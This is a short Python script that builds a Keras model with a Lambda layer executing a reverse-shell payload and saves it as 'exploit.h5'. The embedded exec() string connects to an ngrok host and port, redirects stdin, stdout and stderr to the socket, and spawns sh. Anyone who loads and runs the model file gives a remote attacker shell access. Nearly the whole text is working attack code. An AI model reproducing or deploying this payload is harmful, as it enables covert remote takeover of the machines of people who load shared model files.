import keras

f = lambda x: (
    exec("import sys;sys.stdout.flush();import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"2.tcp.eu.ngrok.io\",10783));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import subprocess; subprocess.run(\"sh\")"),
    x,
)

model = keras.Sequential()
model.add(keras.layers.Input(shape=(1,)))
model.add(keras.layers.Lambda(f))
model.compile()

keras.saving.save_model(model, "./exploit.h5")